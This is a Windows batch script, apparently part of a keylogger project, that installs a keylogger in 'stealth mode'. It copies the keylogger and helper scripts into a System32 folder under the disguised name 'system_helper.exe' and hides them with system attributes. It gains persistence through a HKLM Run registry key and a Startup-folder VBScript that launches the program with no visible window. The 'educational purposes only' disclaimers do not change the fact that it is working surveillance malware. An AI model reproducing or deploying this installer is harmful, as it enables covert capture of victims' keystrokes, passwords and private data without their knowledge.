@echo off
REM Windows Keylogger Stealth Installer
REM WARNING: For educational purposes only. Unauthorized use is illegal.

REM Check for admin rights
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Please run this script as Administrator
    pause
    exit /b
)

REM Configuration
set INSTALL_DIR=C:\Windows\System32\SystemHelper
set KEYLOGGER_NAME=system_helper.exe
set REG_KEY=HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

REM Create installation directory
mkdir "%INSTALL_DIR%" 2>nul

REM Copy keylogger files
copy ..\Backend\keylogger.py "%INSTALL_DIR%\%KEYLOGGER_NAME%" /Y
copy ..\Backend\encrypt.py "%INSTALL_DIR%\encrypt.py" /Y
copy ..\Backend\stealth.py "%INSTALL_DIR%\stealth.py" /Y

REM Set file attributes to hidden and system
attrib +h +s "%INSTALL_DIR%\%KEYLOGGER_NAME%"
attrib +h +s "%INSTALL_DIR%\encrypt.py"
attrib +h +s "%INSTALL_DIR%\stealth.py"

REM Add to Registry for persistence
reg add "%REG_KEY%" /v "SystemHelper" /t REG_SZ /d "%INSTALL_DIR%\%KEYLOGGER_NAME%" /f

REM Create a VBScript to hide console window
echo Set WshShell = CreateObject("WScript.Shell") > "%INSTALL_DIR%\run.vbs"
echo WshShell.Run "%INSTALL_DIR%\%KEYLOGGER_NAME%", 0, False >> "%INSTALL_DIR%\run.vbs"

REM Add VBScript to startup
copy "%INSTALL_DIR%\run.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\run.vbs" /Y

echo Keylogger installed successfully in stealth mode.
echo WARNING: Unauthorized use is strictly prohibited.

pause 